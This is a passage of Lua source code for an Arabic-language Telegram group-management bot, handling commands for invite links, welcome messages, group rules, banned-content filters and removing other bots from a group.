linkgp = '\n> ['..ta.title_..']('..link..') \n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n- ['..link..'] '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = URL.escape(ta.title_),url=link},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(linkgp).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = '\n> ['..ta.title_..']('..linkgpp.result..') \n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n- ['..linkgpp.result..'] '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = URL.escape(ta.title_),url=linkgpp.result},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(linkgp).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,'> لا يوجد رابط ارسل ضع رابط')
end                
end            
 end,nil)
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
if Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  *✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت* \n*✦┇اشتࢪڪ هنا عمࢪي* ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," *✦┇تم مسح الرابط*")   
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false  
end
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) and msg.reply_to_message_id_ == 0 then      
database:sadd(bot_id.."Neverland:allM"..msg.chat_id_, msg.id_)
end
if text == 'رقمي' then   
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
one_nu = "✦┇رقمك {`"..(result.phone_number_).."`}"
else
one_nu = "✦┇تم وضع رقمك لجهاتك اتصالك فقط"
end      
send(msg.chat_id_, msg.id_,one_nu) 
end,nil)
end 
if text == 'بايو' then   
send(msg.chat_id_, msg.id_,getbio(msg.sender_user_id_)) 
end 
if text == 'ايديي' then   
send(msg.chat_id_, msg.id_,'*✦┇ايديك >* '..msg.sender_user_id_)
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) and msg.reply_to_message_id_ == 0 then      
database:sadd(bot_id.."Neverland:allM"..msg.chat_id_, msg.id_)
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) then      
database:sadd(bot_id.."msg:media"..msg.chat_id_, msg.id_)
end
if text and text:match("^ضع صوره") and Addictive(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^وضع صوره") and Addictive(msg) and msg.reply_to_message_id_ == 0 then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي الصوره") 
return false
end
if text == "حذف الصوره" or text == "مسح الصوره" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*✦┇تم ازالة صورة المجموعه*") 
end
return false  
end
if text == "ضع وصف" or text == "وضع وصف" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
database:setex(bot_id.."Neverland:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,"*✦┇ارسل الان الوصف*")
end
return false  
end
if text == "ضع ترحيب" or text == "وضع ترحيب" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
database:setex(bot_id.."Neverland:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = "✦┇ارسل لي الترحيب الان"
tt = "\n✦┇تستطيع اضافة مايلي !\n✦┇دالة عرض الاسم ↜{`name`}\n✦┇دالة عرض المعرف ↜{`user`}"
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == "الترحيب" and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_)   then 
Welcome = database:get(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_)  
else 
Welcome = "*✦┇لم يتم تعيين ترحيب للمجموعه*"
end 
send(msg.chat_id_, msg.id_,"["..Welcome.."]") 
return false  
end
if text == "تفعيل الترحيب" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Chek:Welcome"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"*✦┇تم تفعيل ترحيب المجموعه*") 
return false  
end
if text == "تعطيل الترحيب" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Chek:Welcome"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*✦┇تم تعطيل ترحيب المجموعه*") 
return false  
end
if text == "مسح الترحيب" or text == "حذف الترحيب" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
database:del(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*✦┇تم ازالة ترحيب المجموعه*") 
end
return false  
end
if text == "قائمه المنع" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Filter:msg",msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = bot_id},function(arg,data) 
local Text ='*✦┇قائمه الممنوعات*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'صور', url="https://t.me/"..data.username_.."?start=ph"..msg.chat_id_},{text = 'كلمات', url="https://t.me/"..data.username_.."?start=msg"..msg.chat_id_}},
{{text = 'متحركات', url="https://t.me/"..data.username_.."?start=gif"..msg.chat_id_},{text = 'ملصقات', url="https://t.me/"..data.username_.."?start=Sti"..msg.chat_id_}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == "مسح قائمه المنع" and Addictive(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local listtext = database:smembers(bot_id.."Neverland:List:Filter:text"..msg.chat_id_)  
for k,v in pairs(listtext) do  
database:srem(bot_id.."Neverland:List:Filter:text"..msg.chat_id_,v)  
end  
local listAnimation = database:smembers(bot_id.."Neverland:List:Filter:Animation"..msg.chat_id_)  
for k,v in pairs(listAnimation) do  
database:srem(bot_id.."Neverland:List:Filter:Animation"..msg.chat_id_,v)  
end  
local listSticker = database:smembers(bot_id.."Neverland:List:Filter:Sticker"..msg.chat_id_)  
for k,v in pairs(listSticker) do  
database:srem(bot_id.."Neverland:List:Filter:Sticker"..msg.chat_id_,v)  
end  
local listPhoto = database:smembers(bot_id.."Neverland:List:Filter:Photo"..msg.chat_id_)  
for k,v in pairs(listPhoto) do  
database:srem(bot_id.."Neverland:List:Filter:Photo"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"✦┇تم مسح قائمه المنع")  
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and VIP_DeV(msg) then       
send(msg.chat_id_, msg.id_,"✦┇الان ارسل { كلمه،صوره،ملصق،متحركه } لمنعه من المجموعه")  
database:set(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"*✦┇تم منع الكلمه بنجاح*")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:sadd(bot_id.."Neverland:List:Filter:text"..msg.chat_id_,text)  
return false 
end  
end
if msg.content_.ID == 'MessageAnimation' then    
local tsssst = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"✦┇تم منع المتحركه بنجاح")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:sadd(bot_id.."Neverland:List:Filter:Animation"..msg.chat_id_,msg.content_.animation_.animation_.persistent_id_)  
return false 
end  
end
if msg.content_.ID == 'MessageSticker' then    
local tsssst = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"✦┇تم منع الملصق بنجاح")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:sadd(bot_id.."Neverland:List:Filter:Sticker"..msg.chat_id_,msg.content_.sticker_.sticker_.persistent_id_)  
return false 
end  
end
if msg.content_.ID == 'MessagePhoto' then    
local tsssst = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"✦┇تم منع الصوره بنجاح")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:sadd(bot_id.."Neverland:List:Filter:Photo"..msg.chat_id_,msg.content_.photo_.sizes_[1].photo_.persistent_id_)  
return false 
end  
end
if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Addictive(msg) then    
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
send(msg.chat_id_, msg.id_,"✦┇الان ارسل { كلمه،صوره،ملصق،متحركه } ممنوع لالغاء منعه")  
database:set(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false 
end
if text then 
local test = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء منعها ")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:srem(bot_id.."Neverland:List:Filter:text"..msg.chat_id_,text)  
return false
end  
end
if msg.content_.ID == 'MessageAnimation' then    
local onte = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if onte and onte == "reppp" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء منع المتحركه بنجاح ")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:srem(bot_id.."Neverland:List:Filter:Animation"..msg.chat_id_,msg.content_.animation_.animation_.persistent_id_)  
return false
end  
end
if msg.content_.ID == 'MessageSticker' then    
local Stic = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if Stic and Stic == "reppp" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء منع الملصق بنجاح ")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:srem(bot_id.."Neverland:List:Filter:Sticker"..msg.chat_id_,msg.content_.sticker_.sticker_.persistent_id_)  
return false
end  
end
if msg.content_.ID == 'MessagePhoto' then    
local hoto = database:get(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if hoto and hoto == "reppp" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء منع الصوره بنجاح ")  
database:del(bot_id.."Neverland:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:srem(bot_id.."Neverland:List:Filter:Photo"..msg.content_.photo_.sizes_[1].photo_.persistent_id_)  
return false
end  
end
if text == "مسح البوتات" and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
Kick_Group(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "✦┇لا توجد بوتات في المجموعه")
else
local t = "✦┇عدد البوتات هنا >> {"..c.."}\n✦┇عدد البوتات التي هي ادمن >> {"..x.."}\n✦┇تم طرد >> {"..(c - x).."} من البوتات"
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
if text == ("كشف البوتات") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n*✦┇قائمة البوتات الموجوده *\n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ""
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = " {✯}"
end
text = text..">> [@"..ta.username_.."]"..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "*✦┇لا توجد بوتات في المجموعه*")
return false 
end
if #admins == i then 
local a = "\n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n*✦┇عدد البوتات التي هنا >> {"..n.."} بوت*\n"
local f = "*✦┇عدد البوتات التي هي ادمن >> {"..t.."}*\n*✦┇ملاحضه علامة ال (✯) تعني ان البوت ادمن *"
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Neverland:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "✦┇تم الغاء حفظ القوانين") 
database:del(bot_id.."Neverland:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Neverland:Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"✦┇تم حفظ قوانين المجموعه") 
database:del(bot_id.."Neverland:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == "ضع قوانين" or text == "وضع قوانين" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
database:setex(bot_id.."Neverland:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"✦┇ارسل لي القوانين الان")  
end
end
if text == "مسح القوانين" or text == "حذف القوانين" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then
send(msg.chat_id_, msg.id_,"✦┇تم ازالة قوانين المجموعه")  
database:del(bot_id.."Neverland:Set:Rules:Group"..msg.chat_id_) 
end
end
if text == "القوانين" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Set_Rules = database:get(bot_id.."Neverland:Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"✦┇لا توجد قوانين هنا")   
end    
end

if text == "الاوامر المضافه" and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_.."")
t = "*✦┇قائمه الاوامر المضافه  *\n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end
if #list == 0 then
t = "*✦┇لا توجد اوامر اضافيه*"
return send(msg.chat_id_, msg.id_, t)
end
